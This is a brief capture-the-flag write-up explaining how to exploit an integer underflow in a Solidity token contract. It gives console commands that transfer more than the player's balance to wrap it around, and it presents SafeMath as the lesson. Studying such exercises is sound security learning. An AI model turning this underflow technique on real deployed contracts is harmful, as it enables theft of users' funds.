Learning: the important of using safemath to avoid common math issues like underflow or overflow. There's a pretty [insightful](https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17d) post by Georgios Konstantopoulos on Solidity smart contract common vulnerabilities. In this case, we are looking to exploit number 1.


### Solution
In order to underflow, it will be as easy as going to the console and transfer more than the player current balance
1. Figure out the player's balance:
```
let player_balance = await contract.balanceOf(player).then(v => v.toString());
```

2. Figure out the deployer's balance, just to confirm that most of the supply is there:
```
await contract.balanceOf(level).then(v => v.toString());
```

3. We want to force the user to hold a negative balance (because balance is of type unsigned integer). There we will send a bit more than his current balance to the deployer address, who holds the initial supply:
```
await contract.transfer(level, player_balance + 1);
```